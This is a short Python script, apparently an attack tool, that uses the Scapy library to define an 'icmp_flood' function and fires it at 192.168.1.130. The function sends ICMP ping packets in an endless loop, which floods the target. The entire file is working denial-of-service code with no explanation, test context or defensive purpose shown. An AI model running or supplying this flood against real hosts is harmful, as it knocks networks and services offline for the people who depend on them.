from scapy.all import IP, ICMP, send

def icmp_flood(target_ip):
    # Send a continuous stream of ping requests
    packet = IP(dst=target_ip)/ICMP()
    send(packet, loop=1, verbose=False)

icmp_flood("192.168.1.130")
